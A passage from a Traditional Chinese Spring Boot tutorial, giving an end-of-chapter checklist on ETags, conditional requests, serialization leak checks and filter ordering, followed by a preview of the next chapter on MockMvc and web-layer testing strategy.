- [ ] 我知道序列化失敗要立刻告警（`for: 0m`）。
- [ ] 我有一份「正常回應的資訊洩漏檢查清單」，也知道 `hibernateLazyInitializer` 代表什麼。
- [ ] **我知道 `ShallowEtagHeaderFilter` 不省伺服器工作，而且會讓串流端點 OOM。**
- [ ] 我知道「快速 304」的做法與它省下的成本（18 ms → 1.2 ms）。
- [ ] 我知道 ETag 要包含「表述識別」，否則客服版會被快取給客戶。
- [ ] 我知道 weak ETag 不能用於 `Range` 請求。
- [ ] 我知道 `Vary: Authorization` + `Cache-Control: private` + ETag 是三層防護。
- [ ] 我知道集合端點的 ETag 通常沒有價值。
- [ ] **我知道 412（重新取得就能成功）與 409（狀態不允許）的判準。**
- [ ] 我知道 428 Precondition Required 的用途，也知道錯誤訊息要說「ETag 從哪裡拿」。
- [ ] **我知道沒 expose `ETag` 會讓整個樂觀鎖機制在瀏覽器上無法使用。**
- [ ] 我知道 Web 層的 `If-Match` 比對不是併發保證，Service 層仍要有 `@Version`。
- [ ] **我知道兩個 filter 用相同 order 的執行順序是未定義的。**
- [ ] 我有一個測試守住「order 唯一」與「CorsFilter 最先」。
- [ ] 我知道「掃描實際回應」比「檢查 DTO 欄位」能抓到更多洩漏。
- [ ] 我知道測試失敗的訊息裡不可以放找到的敏感值。
- [ ] 我知道序列化的往返測試要驗證「第二次往返完全穩定」。
- [ ] 我知道「金額差一分錢」幾乎都是「在錯的時機捨入」。
- [ ] 我知道已成立的財務交易不可以修正，只能加調整紀錄。

---

## 6.14 下一章預告

到這裡，shop-service 的 Web 層**功能上已經完整了**：
路由、綁定、驗證、錯誤格式、追蹤、檔案、串流、CORS、序列化。

**07 章要回答一個問題：你怎麼知道它們都是對的？**

這一章與前六章的測試片段不同 —— 它要建立一套**系統性的** Web 層測試策略：

- **`@WebMvcTest` 的切片邊界**：它載入了什麼、沒載入什麼、
  **為什麼 `@WebMvcTest` 裡的 Security 行為與正式環境不同**
  （以及那造成過的假綠燈）。
- **MockMvc 的完整語法地圖**：`perform` / `andExpect` / `andDo` /
  `jsonPath` 的進階用法、`asyncDispatch`（05 章）、`multipart`（05 章）、
  以及 **Spring 6.2 的 `MockMvcTester`**（AssertJ 風格的新 API）。
- **`@MockBean` 的三個陷阱**：它會讓 context 被重建（測試變慢 10 倍）、
  它的 `given()` 沒設就回 `null`（而 `null` 通常不是你要測的）、
  以及 **Boot 3.4 開始它被 `@MockitoBean` 取代**。
- **測試金字塔在 Web 層的具體形狀**：哪些用單元測試（`SafeFilename`、`CsvWriter`）、
  哪些用切片（`@WebMvcTest`）、哪些**必須**用整合測試（filter 順序、CORS、SSE）。
- **參數化測試的威力**：用一個 `@MethodSource` 覆蓋 83 個 `ErrorCode`、
  覆蓋所有 enum 值、覆蓋所有端點的授權矩陣。
- **測試資料的建構**：Object Mother vs Test Data Builder，
  以及**為什麼「一個 `createOrder()` 輔助方法」會在第 40 個測試時崩塌**。
- **契約測試**：從 `orders-api.yaml` 自動驗證實作
  （03-rest-api 第 07 章的落地），以及 **Spring REST Docs**
  讓「文件與測試是同一份東西」。
- **授權矩陣測試** ★：`70 條端點 × 5 種角色 = 350 個組合`，
  怎麼用一個表格驅動的測試涵蓋它們 ——
  以及**為什麼這是最值得寫的一組測試**（IDOR 是最常見的 API 漏洞）。
- **測試的反模式**：斷言 `status().isOk()` 卻沒斷言 body、
  用 `@Transactional` 讓測試「自動回滾」而掩蓋了真實的交易行為、
  **在測試裡重新實作被測邏輯**。
- **CI 的組織**：哪些測試每次 push 都跑、哪些只在 nightly 跑、
  怎麼讓 3000 個測試在 4 分鐘內跑完。

---

完成後請前往 [07-controller-testing-mockmvc.md](./07-controller-testing-mockmvc.md)。
